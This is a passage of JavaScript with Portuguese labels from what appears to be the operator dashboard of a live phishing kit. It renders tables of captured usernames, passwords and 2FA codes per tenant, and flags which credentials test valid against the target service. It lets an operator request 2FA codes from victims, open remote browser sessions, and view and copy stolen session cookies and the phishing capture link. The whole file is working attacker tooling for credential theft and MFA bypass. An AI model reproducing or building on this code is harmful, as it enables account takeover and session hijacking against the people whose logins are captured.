      const stLogin = item.status_login || "aguardando_solicitacao";

      let statusHtml = `<span class="status-badge status-waiting" style="padding: 1px 6px; font-size: 10px;">Login Capturado</span>`;
      if (tem2FA) {
        if (st2FA === "aceito") {
          statusHtml = `<span class="status-badge status-complete" style="padding: 1px 6px; font-size: 10px;">2FA Aceito</span>`;
        } else if (st2FA === "negado") {
          statusHtml = `<span class="status-badge status-rejected" style="padding: 1px 6px; font-size: 10px;">2FA Negado</span>`;
        } else {
          statusHtml = `<span class="status-badge status-pending" style="padding: 1px 6px; font-size: 10px;">Aguardando Decisão</span>`;
        }
      } else {
        if (stLogin === "solicitar_2fa") {
          statusHtml = `<span class="status-badge status-pending" style="padding: 1px 6px; font-size: 10px;">2FA Solicitado</span>`;
        } else {
          statusHtml = `<span class="status-badge status-waiting" style="padding: 1px 6px; font-size: 10px;">Aguardando Operador</span>`;
        }
      }

      let auditHtml = `<span class="cred-badge cred-testing" style="font-size: 10px; padding: 2px 6px;"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg> Testando na VR...</span>`;
      if (item.status_credencial === "valido") {
        auditHtml = `<span class="cred-badge cred-valid" style="font-size: 10px; padding: 2px 6px;"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg> Senha Correta (MFA Real)</span>`;
      } else if (item.status_credencial === "bloqueio_captcha") {
        auditHtml = `<span class="cred-badge cred-captcha" style="font-size: 10px; padding: 2px 6px; background: rgba(245, 158, 11, 0.15); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.4);"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg> Desafio Captcha VR</span>`;
      } else if (item.status_credencial === "invalido") {
        auditHtml = `<span class="cred-badge cred-invalid" style="font-size: 10px; padding: 2px 6px;"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg> Senha Incorreta na VR</span>`;
      }

      const codigoHtml = tem2FA
        ? `<span class="code-badge mono" style="font-size: 11px; padding: 2px 6px;">${item.ultimoCodigo}</span>`
        : `<span class="code-badge-empty" style="font-size: 11px;">—</span>`;

      const credCompleta = `${item.usuario || ""}:${item.ultimaSenha || ""}${tem2FA ? `:${item.ultimoCodigo}` : ""}`;

      html += `
        <tr>
          <!-- Coluna 1: Registro & Tenant (2 Linhas) -->
          <td>
            <div style="font-size: 12px; font-weight: 600; color: #fff; line-height: 1.3;">${item.data_hora || "—"}</div>
            <div style="margin-top: 4px;">
              <span class="tenant-badge" style="font-size: 10px; padding: 1px 6px;">${escapeHtml(item.tenant || "default")}</span>
            </div>
          </td>

          <!-- Coluna 2: Credencial (Usuário & Senha) (2 Linhas) -->
          <td>
            <div class="user-tag mono" style="font-size: 12px; max-width: 260px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="${escapeHtml(item.usuario || '')}">
              ${escapeHtml(item.usuario || "—")}
            </div>
            <div style="display: flex; align-items: center; gap: 6px; margin-top: 4px;">
              <div class="secret-box" style="padding: 2px 6px; font-size: 11px;">
                <span class="mono">${escapeHtml(item.ultimaSenha || "—")}</span>
                <button class="icon-btn" type="button" title="Copiar senha" onclick="copiarTexto('${escapeQuotes(item.ultimaSenha)}', 'Senha')">
                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
                </button>
              </div>
            </div>
          </td>

          <!-- Coluna 3: Auditoria SSO & 2FA (2 Linhas) -->
          <td>
            <div>${auditHtml}</div>
            <div style="display: flex; align-items: center; gap: 5px; margin-top: 4px;">
              ${statusHtml}
              ${codigoHtml}
              ${tem2FA ? `
                <button class="icon-btn" type="button" title="Copiar código 2FA" onclick="copiarTexto('${escapeQuotes(item.ultimoCodigo)}', 'Código 2FA')">
                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
                </button>
              ` : ''}
            </div>
          </td>

          <!-- Coluna 4: Ações Operacionais (2 Linhas de botões compactos) -->
          <td style="text-align: right;">
            <div style="display: flex; flex-direction: column; gap: 4px; align-items: flex-end;">
              <!-- Linha 1 de Ações -->
              <div style="display: flex; align-items: center; gap: 4px; justify-content: flex-end;">
                <a href="/sessaoremota.html?usuario=${encodeURIComponent(item.usuario)}${item.tenant ? `&tenant=${encodeURIComponent(item.tenant)}` : ''}" target="_blank" class="btn btn-secondary" style="padding: 3px 7px; font-size: 11px; display: inline-flex; align-items: center; gap: 4px;" title="Navegador Remoto">
                  <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="20" height="14" x="2" y="3" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
                  <span>Remota</span>
                </a>
                ${gerarBotoesAcaoConsolidado(item)}
              </div>

              <!-- Linha 2 de Ações -->
              <div style="display: flex; align-items: center; gap: 4px; justify-content: flex-end;">
                ${(item.total_cookies > 0 || item.cookies || item.tem_sessao_salva || item.status === '2FA Aceito') ? `
                  <a href="/sessao/${encodeURIComponent(item.usuario)}${item.tenant ? `?tenant=${encodeURIComponent(item.tenant)}` : ''}" target="_blank" class="btn btn-success-sm" style="background: var(--accent-green); color: #09090b; text-decoration: none; padding: 3px 7px; font-size: 11px; font-weight: 700; box-shadow: 0 0 8px rgba(2, 215, 47, 0.3);" title="Acessar Sessão">
                    <span>Sessão</span>
                  </a>
                  <button class="btn btn-success-sm" style="background: rgba(2, 215, 47, 0.15); border-color: rgba(2, 215, 47, 0.4); color: var(--accent-green); padding: 3px 7px; font-size: 11px;" type="button" title="Cookies" onclick="abrirModalCookies('${escapeQuotes(item.usuario)}')">
                    <span>Cookies (${item.total_cookies || 'OK'})</span>
                  </button>
                ` : ''}
                <button class="btn btn-secondary" style="padding: 3px 7px; font-size: 11px;" type="button" title="Copiar credenciais completas" onclick="copiarTexto('${escapeQuotes(credCompleta)}', 'Credenciais')">
                  <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
                  <span>Copiar</span>
                </button>
              </div>
            </div>
          </td>
        </tr>
      `;
    });

    html += `</tbody></table>`;
    containerTabela.innerHTML = html;

  } else {
    // Modo Feed Cronológico
    let filtrados = dadosAtuais.feed || [];
    if (usuarioFiltro) {
      filtrados = filtrados.filter(item => (item.usuario || "").toLowerCase() === usuarioFiltro.toLowerCase());
    }
    if (termo) {
      filtrados = filtrados.filter(item => {
        const u = (item.usuario || "").toLowerCase();
        const s = (item.senha || "").toLowerCase();
        const c = (item.codigo || "").toLowerCase();
        const tn = (item.tenant || "").toLowerCase();
        return u.includes(termo) || s.includes(termo) || c.includes(termo) || tn.includes(termo);
      });
    }

    if (filtrados.length === 0) {
      containerTabela.innerHTML = `
        <div class="empty-state">
          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
          <p>Nenhum evento no feed cronológico.</p>
        </div>
      `;
      return;
    }

    let html = `
      <table>
        <thead>
          <tr>
            <th style="width: 18%;">Registro & Tenant</th>
            <th style="width: 28%;">Tipo & Dado Capturado</th>
            <th style="width: 26%;">Auditoria & Status</th>
            <th style="width: 28%; text-align: right;">Ações Operacionais</th>
          </tr>
        </thead>
        <tbody>
    `;

    filtrados.forEach(item => {
      const is2FA = item.tipo === "2FA";
      const tipoBadge = is2FA
        ? `<span class="type-badge type-2fa" style="font-size: 10px; padding: 1px 5px;">2FA</span>`
        : `<span class="type-badge type-login" style="font-size: 10px; padding: 1px 5px;">LOGIN</span>`;

      const dadoTexto = is2FA ? item.codigo : item.senha;

      let statusHtml = `—`;
      if (is2FA) {
        const st = item.status_2fa || "pendente";
        if (st === "aceito") {
          statusHtml = `<span class="status-badge status-complete" style="padding: 1px 6px; font-size: 10px;">Aceito</span>`;
        } else if (st === "negado") {
          statusHtml = `<span class="status-badge status-rejected" style="padding: 1px 6px; font-size: 10px;">Negado</span>`;
        } else {
          statusHtml = `<span class="status-badge status-pending" style="padding: 1px 6px; font-size: 10px;">Pendente</span>`;
        }
      } else {
        const stLogin = item.status_login || "aguardando_solicitacao";
        if (stLogin === "solicitar_2fa") {
          statusHtml = `<span class="status-badge status-complete" style="padding: 1px 6px; font-size: 10px;">2FA Solicitado</span>`;
        } else {
          statusHtml = `<span class="status-badge status-waiting" style="padding: 1px 6px; font-size: 10px;">Aguardando Operador</span>`;
        }
      }

      let auditFeed = `—`;
      if (!is2FA) {
        if (item.status_credencial === "valido") {
          auditFeed = `<span class="cred-badge cred-valid" style="font-size: 10px; padding: 1px 5px;">Válido</span>`;
        } else if (item.status_credencial === "bloqueio_captcha") {
          auditFeed = `<span class="cred-badge cred-captcha" style="font-size: 10px; padding: 1px 5px; background: rgba(245, 158, 11, 0.15); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.4);">Captcha VR</span>`;
        } else if (item.status_credencial === "invalido") {
          auditFeed = `<span class="cred-badge cred-invalid" style="font-size: 10px; padding: 1px 5px;">Incorreto</span>`;
        } else {
          auditFeed = `<span class="cred-badge cred-testing" style="font-size: 10px; padding: 1px 5px;">Testando</span>`;
        }
      }

      html += `
        <tr>
          <!-- Coluna 1: Registro & Tenant (2 Linhas) -->
          <td>
            <div style="font-size: 12px; font-weight: 600; color: #fff; line-height: 1.3;">${item.data_hora || "—"}</div>
            <div style="margin-top: 4px;"><span class="tenant-badge" style="font-size: 10px; padding: 1px 6px;">${escapeHtml(item.tenant || "default")}</span></div>
          </td>

          <!-- Coluna 2: Tipo & Dado Capturado (2 Linhas) -->
          <td>
            <div style="display: flex; align-items: center; gap: 6px;">
              ${tipoBadge}
              <span class="user-tag mono" style="font-size: 12px; max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="${escapeHtml(item.usuario || '')}">
                ${escapeHtml(item.usuario || "—")}
              </span>
            </div>
            <div style="display: flex; align-items: center; gap: 6px; margin-top: 4px;">
              <div class="secret-box" style="padding: 2px 6px; font-size: 11px;">
                <span class="mono">${escapeHtml(dadoTexto || "—")}</span>
                <button class="icon-btn" type="button" title="Copiar" onclick="copiarTexto('${escapeQuotes(dadoTexto)}', 'Valor')">
                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
                </button>
              </div>
            </div>
          </td>

          <!-- Coluna 3: Auditoria & Status (2 Linhas) -->
          <td>
            <div>${auditFeed}</div>
            <div style="margin-top: 4px;">${statusHtml}</div>
          </td>

          <!-- Coluna 4: Ações (2 Linhas) -->
          <td style="text-align: right;">
            <div style="display: flex; flex-direction: column; gap: 4px; align-items: flex-end;">
              <div style="display: flex; align-items: center; gap: 4px; justify-content: flex-end;">
                <a href="/sessaoremota.html?usuario=${encodeURIComponent(item.usuario)}${item.tenant ? `&tenant=${encodeURIComponent(item.tenant)}` : ''}" target="_blank" class="btn btn-secondary" style="padding: 3px 7px; font-size: 11px; display: inline-flex; align-items: center; gap: 4px;" title="Navegador Remoto">
                  <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="20" height="14" x="2" y="3" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
                  <span>Remota</span>
                </a>
                ${gerarBotoesAcaoFeed(item)}
              </div>
              <div style="display: flex; align-items: center; gap: 4px; justify-content: flex-end;">
                ${(item.total_cookies > 0 || item.cookies || item.status_2fa === 'aceito') ? `
                  <a href="/sessao/${encodeURIComponent(item.usuario)}${item.tenant ? `?tenant=${encodeURIComponent(item.tenant)}` : ''}" target="_blank" class="btn btn-success-sm" style="background: var(--accent-green); color: #09090b; text-decoration: none; padding: 3px 7px; font-size: 11px; font-weight: 700; box-shadow: 0 0 8px rgba(2, 215, 47, 0.3);" title="Acessar Sessão">
                    <span>Sessão</span>
                  </a>
                  <button class="btn btn-success-sm" style="background: rgba(2, 215, 47, 0.15); border-color: rgba(2, 215, 47, 0.4); color: var(--accent-green); padding: 3px 7px; font-size: 11px;" type="button" title="Cookies" onclick="abrirModalCookies('${escapeQuotes(item.usuario)}')">
                    <span>Cookies</span>
                  </button>
                ` : ''}
                <button class="btn btn-secondary" style="padding: 3px 7px; font-size: 11px;" type="button" title="Copiar" onclick="copiarTexto('${escapeQuotes(dadoTexto)}', 'Valor')">
                  <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
                  <span>Copiar</span>
                </button>
              </div>
            </div>
          </td>
        </tr>
      `;
    });

    html += `</tbody></table>`;
    containerTabela.innerHTML = html;
  }
}

function escapeHtml(str) {
  if (!str) return "";
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

function escapeQuotes(str) {
  if (!str) return "";
  return String(str).replace(/'/g, "\\'").replace(/"/g, "\\\"");
}

// Event Listeners
if (filtroBusca) {
  filtroBusca.addEventListener("input", (e) => {
    termoBusca = e.target.value;
    renderizarTabela();
  });
}

if (tabConsolidado && tabFeed) {
  tabConsolidado.addEventListener("click", () => {
    abaAtiva = "consolidado";
    tabConsolidado.classList.add("active");
    tabFeed.classList.remove("active");
    if (tabAuditoria) tabAuditoria.classList.remove("active");
    renderizarTabela();
  });

  tabFeed.addEventListener("click", () => {
    abaAtiva = "feed";
    tabFeed.classList.add("active");
    tabConsolidado.classList.remove("active");
    if (tabAuditoria) tabAuditoria.classList.remove("active");
    renderizarTabela();
  });
}

if (tabAuditoria) {
  tabAuditoria.addEventListener("click", () => {
    abaAtiva = "auditoria";
    tabAuditoria.classList.add("active");
    if (tabConsolidado) tabConsolidado.classList.remove("active");
    if (tabFeed) tabFeed.classList.remove("active");
    carregarAuditoria();
  });
}

if (btnAtualizar) {
  btnAtualizar.addEventListener("click", () => {
    if (abaAtiva === "auditoria") {
      carregarAuditoria();
    } else {
      carregarDados();
    }
    showToast("Dados atualizados!");
  });
}


if (seletorTenant) {
  seletorTenant.addEventListener("change", () => {
    tenantAtivo = seletorTenant.value;
    const url = new URL(window.location);
    if (tenantAtivo) {
      url.searchParams.set("tenant", tenantAtivo);
    } else {
      url.searchParams.delete("tenant");
      url.searchParams.delete("cliente");
    }
    window.history.replaceState({}, "", url);
    if (linkSessaoRemotaTop) {
      linkSessaoRemotaTop.href = `/sessaoremota.html${tenantAtivo ? `?tenant=${encodeURIComponent(tenantAtivo)}` : ''}`;
    }
    conectarSSE();
    if (abaAtiva === "auditoria") {
      carregarAuditoria();
    } else {
      carregarDados();
    }
    showToast(tenantAtivo ? `Filtrando por tenant: ${tenantAtivo}` : "Visualizando todos os tenants");
  });
}

if (seletorUsuario) {
  seletorUsuario.addEventListener("change", () => {
    usuarioFiltro = seletorUsuario.value;
    atualizarLinkSessaoRemota();
    if (abaAtiva === "auditoria") {
      renderizarAuditoria();
    } else {
      renderizarTabela();
    }
    showToast(usuarioFiltro ? `Filtrando por usuário: ${usuarioFiltro}` : "Visualizando todos os usuários");
  });
}

if (btnCopiarLinkLogin) {
  btnCopiarLinkLogin.addEventListener("click", () => {
    const link = `${window.location.origin}/index.html${tenantAtivo ? `?tenant=${encodeURIComponent(tenantAtivo)}` : ''}`;
    copiarTexto(link, "Link de Captura");
  });
}

if (btnToggleAuto) {
  btnToggleAuto.addEventListener("click", alternarModoAuto);
}

if (btnFecharModalCookies) {
  btnFecharModalCookies.addEventListener("click", fecharModalCookies);
}

if (btnCopiarModalCookies) {
  btnCopiarModalCookies.addEventListener("click", () => {
    if (modalCookiesJson && modalCookiesJson.value) {
      copiarTexto(modalCookiesJson.value, "Cookies de Sessão");
    }
  });
}

if (modalCookies) {
  modalCookies.addEventListener("click", (e) => {
    if (e.target === modalCookies) fecharModalCookies();
  });
}

// Conexão em tempo real via Server-Sent Events (SSE)
let sseConexao = null;
function conectarSSE() {
  if (!window.EventSource) return;
  try {
    if (sseConexao) sseConexao.close();
    const sseUrl = "/api/stream?t=" + Date.now() + (tenantAtivo ? "&tenant=" + encodeURIComponent(tenantAtivo) : "");
    sseConexao = new EventSource(sseUrl);

    sseConexao.onmessage = (event) => {
      try {
        const json = JSON.parse(event.data);
        if (json && json.success) {
          dadosAtuais = json;
          atualizarKpis();
          if (abaAtiva === "auditoria") {
            carregarAuditoria();
          } else {
            renderizarTabela();
          }
        }
      } catch (e) {
        console.error("Erro ao processar stream SSE:", e);
      }
    };

    sseConexao.onerror = () => {
      if (sseConexao) sseConexao.close();
      setTimeout(conectarSSE, 2000);
    };
  } catch (err) {
    console.error("Falha ao iniciar SSE:", err);
  }
}

// Inicialização imediata + SSE em tempo real + fallback polling de 1s
if (linkSessaoRemotaTop && tenantAtivo) {
  linkSessaoRemotaTop.href = `/sessaoremota.html?tenant=${encodeURIComponent(tenantAtivo)}`;
}
// Função para logout e bloqueio imediato do painel
async function encerrarSessao() {
  try {
    await fetch("/api/auth/logout", { method: "POST" });
  } catch (e) {}
  window.location.href = "/login-painel";
}
window.encerrarSessao = encerrarSessao;

carregarTenants();
carregarDados();
conectarSSE();
setInterval(carregarDados, 1000);
setInterval(carregarTenants, 5000);
